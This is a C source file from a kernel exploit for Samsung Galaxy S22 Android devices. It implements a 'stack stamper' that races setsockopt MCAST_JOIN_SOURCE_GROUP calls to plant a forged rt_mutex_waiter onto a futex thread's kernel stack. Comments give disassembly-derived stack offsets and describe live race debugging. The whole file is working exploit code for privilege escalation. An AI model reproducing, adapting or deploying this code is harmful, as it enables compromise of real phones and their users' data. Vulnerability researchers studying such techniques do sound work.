/*
 * stack stamper — sprays the payload onto the waiter's kernel stack
 * via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 64-bit native path (S901W / S22, 5.10.168-android12-9-27760517-abS901WVLS4DWL3).
 *
 * Ported from b0q (S22 Ultra, 5.10.226) which used the 32-bit compat setsockopt
 * path (__arm64_compat_sys_setsockopt is a ENOSYS stub on S901W 5.10.168, so
 * the compat stamp is structurally dead on this kernel).  The 64-bit native path
 * is used instead: TIF_32BIT=0 causes do_ipv6_setsockopt to take the native
 * group_source_req branch (optlen=264, buffer at inner_sp+0x160).
 *
 * S901W geometry — derived from disassembly of extracted vmlinux:
 *
 *   futex chain frames before futex_wait_requeue_pi entry:
 *     __arm64_sys_futex:          0x70
 *     do_futex:                   0x70
 *                                 ────
 *                                 0xe0
 *
 *   futex_wait_requeue_pi (@ 0xffffffc008227834):
 *     sub sp, sp, #0x1a0
 *     add x27, sp, #0x90          ← x27 = &rt_waiter (local on stack)
 *     rt_waiter = entry_sp - 0x1a0 + 0x90 = entry_sp - 0x110
 *     → rt_waiter = kernel_top - 0xe0 - 0x110 = kernel_top - 0x1f0
 *
 *   setsockopt chain frames before do_ipv6_setsockopt entry:
 *     __arm64_sys_setsockopt:     0x10
 *     __sys_setsockopt:           0x70
 *     sock_common_setsockopt:     0x10  (blr x8 + own epilog, not tail call)
 *     udpv6_setsockopt:           0x40  (bl to do_ipv6 directly, not tail call;
 *                                        skips ipv6_setsockopt for SOL_IPV6=0x29)
 *                                 ────
 *                                 0xd0
 *
 *   do_ipv6_setsockopt (@ 0xffffffc0094987cc):
 *     stp x29, x30, [sp, #-0x60]!    → sp -= 0x60
 *     sub sp, sp, #0x280              → sp -= 0x280  (total frame 0x2e0)
 *     TIF_32BIT=0 branch → native group_source_req at sp+0x160 (0x108 bytes)
 *     → gr = kernel_top - 0xd0 - 0x2e0 + 0x160 = kernel_top - 0x250
 *
 *   STAMP_OFF = rt_waiter - gr = (kernel_top - 0x1f0) - (kernel_top - 0x250)
 *             = 0x60
 *
 *   Fit check: 0x60 + 0x50 (waiter size) = 0xb0 < 0x108 (window). ✓  58 bytes headroom.
 *
 * TCG race fix (observed live on b0q): each setsockopt call memsets gr to 0
 * BEFORE copying the user buffer (do_ipv6_setsockopt+560), so while this
 * thread is mid-call the stale waiter reads as all zeros — a consumer
 * firing then walks waiter->lock==0 and panics in raw_spin_trylock.
 * On bare metal that window is nanoseconds (loops forever and wins by
 * probability); under TCG it is fatal.  So: stamp a bounded number of
 * times, then PARK IN USERSPACE (a pure spin — no syscall frames, no more
 * memsets), and only then release the consumer.  One stable payload, one
 * deterministic shot per child; retries use a fresh child.
 *
 * HARD INVARIANT: no syscalls of any kind between the last stamp and
 * the park — not even a printf.  A write() to the console lands a
 * file_tty_write frame exactly on the waiter slot and tears the payload
 * (observed live via gdb-mcp, 2026-08-08).  Residual race: a CFS tick
 * preempting the parked spin leaves schedule() frames on the region
 * (put_prev_entity LR in waiter->lock) — nanosecond odds on device,
 * stretched under TCG; covered by per-attempt retries; eliminated on
 * the QEMU-root path by exp64_RT (FIFO waiter is not tick-preempted).
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

extern atomic_int g_consumer_go;

/*
 * S901W 5.10.168: stale rt_waiter lands at stamp buffer +0x60 (disassembly-derived).
 * b0q 5.10.226 used +0x58 via the compat setsockopt path; this kernel uses
 * the 64-bit native path (gr at inner_sp+0x160 vs compat gr at inner_sp+0x58).
 */
#define STAMP_OFF       0x60
/* v5.10 rt_mutex_waiter = 80 bytes */
#define WAITER_BYTES    0x50
/* Native group_source_req = 264 bytes (not 260 compat); optlen must match. */
#define STAMP_OPTLEN    264
/* Enough stamps to be sure the full payload is what the last completed
 * call left on the stack; after the loop we never enter the kernel again. */
#define STAMP_ROUNDS    64

void do_stamp_stack(uint64_t *buf) {
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[STAMP_OPTLEN];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        _exit(1);   /* let the parent retry with a fresh child */
    }
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + STAMP_OFF, buf, WAITER_BYTES);

    /*
     * Probe ONE stamp and report it BEFORE the real loop.  After the last
     * setsockopt this thread must make NO more syscalls until the consumer
     * fires: any syscall re-enters the kernel on THIS stack and its frames
     * land right on the stale waiter, tearing the payload.  Observed live
     * (gdb-mcp, TRIG dump): a post-loop pr_warning()'s write() left a
     * file_tty_write frame on the slot (saved LR at waiter+0x18) between
     * the last stamp and the walk -> junk waiter->lock ->
     * rt_mutex_adjust_prio_chain+388 panic (device: waiter->lock=1).
     *
     * Native path (TIF_32BIT=0): do_ipv6_setsockopt takes the native
     * group_source_req branch unconditionally.  optlen=264 is accepted;
     * EACCES = SELinux denied before the copy (stamp did NOT land);
     * EADDRNOTAVAIL/EINVAL = late validation, copy already done (stamp lands);
     * rc=0 = socket actually joined (stamp lands).
     */
    errno = 0;
    {
        int rc = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                            buffer, STAMP_OPTLEN);
        if (rc != 0 && errno == EACCES)
            pr_warning("stamp probe: EACCES — denied BEFORE the copy, "
                       "payload will NOT land\n");
        else if (rc != 0)
            pr_info("stamp probe: rc=%d errno=%d — late validation, "
                    "copy done (stamp lands)\n", rc, errno);
        else
            pr_info("stamp probe: setsockopt succeeded\n");
    }

    for (int i = 0; i < STAMP_ROUNDS; i++)
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                   buffer, STAMP_OPTLEN);

    /* Payload is parked: from here on this thread makes NO syscalls, so
     * nothing memsets or overwrites the waiter region again. */
    atomic_store(&g_consumer_go, 1);
    for (;;)
        __asm__ volatile("nop" ::: "memory");
}
